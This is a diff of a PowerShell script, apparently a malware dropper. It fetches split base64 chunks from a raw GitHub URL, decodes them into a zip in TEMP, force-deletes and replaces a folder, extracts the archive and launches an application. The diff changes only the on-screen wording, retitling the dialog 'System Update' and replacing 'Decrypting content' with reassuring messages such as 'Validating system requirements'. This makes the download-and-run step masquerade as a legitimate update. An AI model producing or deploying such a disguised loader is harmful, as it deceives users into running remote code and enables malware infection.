@@ -11,7 +11,7 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 $form = New-Object System.Windows.Forms.Form
-$form.Text = "macOSx - Loading System"
+$form.Text = "System Update"
 $form.Size = New-Object System.Drawing.Size(400, 150)
 $form.StartPosition = "CenterScreen"
 $form.FormBorderStyle = 'FixedDialog'
@@ -38,7 +38,7 @@ $form.Show()
 $form.Refresh()
 
 $sync = [hashtable]::Synchronized(@{})
-$sync.Status = "Loading content part 1...`nPlease wait."
+$sync.Status = "Preparing setup files...`nThis might take a few moments."
 $sync.Done = $false
 $sync.Error = $null
 $sync.url1 = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main/macOSx.zip.b64.part1'
@@ -57,26 +57,26 @@ $ps = [PowerShell]::Create().AddScript({
 
         $s1 = (Invoke-WebRequest -Uri $sync.url1 -UseBasicParsing).Content.Trim()
         
-        $sync.Status = "Loading content part 2...`nPlease wait."
+        $sync.Status = "Downloading required components...`nPlease wait."
         $s2 = (Invoke-WebRequest -Uri $sync.url2 -UseBasicParsing).Content.Trim()
 
         $b64 = $s1 + $s2
-        $sync.Status = "Decrypting content..."
+        $sync.Status = "Validating system requirements..."
         $bytes = [Convert]::FromBase64String($b64)
 
         $zipPath = Join-Path $env:TEMP ('macOSx-{0}.zip' -f [Guid]::NewGuid().ToString('N'))
         [System.IO.File]::WriteAllBytes($zipPath, $bytes)
 
         if (Test-Path -LiteralPath $sync.destFolder) {
-            $sync.Status = "Clearing old data..."
+            $sync.Status = "Removing temporary files..."
             Remove-Item -LiteralPath $sync.destFolder -Recurse -Force
         }
 
-        $sync.Status = "Updating...`nAlmost done."
+        $sync.Status = "Installing features...`nAlmost done."
         Expand-Archive -LiteralPath $zipPath -DestinationPath $sync.base -Force
         Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue
 
-        $sync.Status = "Completed!`nStarting application..."
+        $sync.Status = "Setup complete!`nStarting application..."
     } catch {
         $sync.Error = $_.Exception.Message
     } finally {
@@ -118,3 +118,4 @@ $form.Close()
 $ps.Dispose()
 $runspace.Close()
 $runspace.Dispose()
+
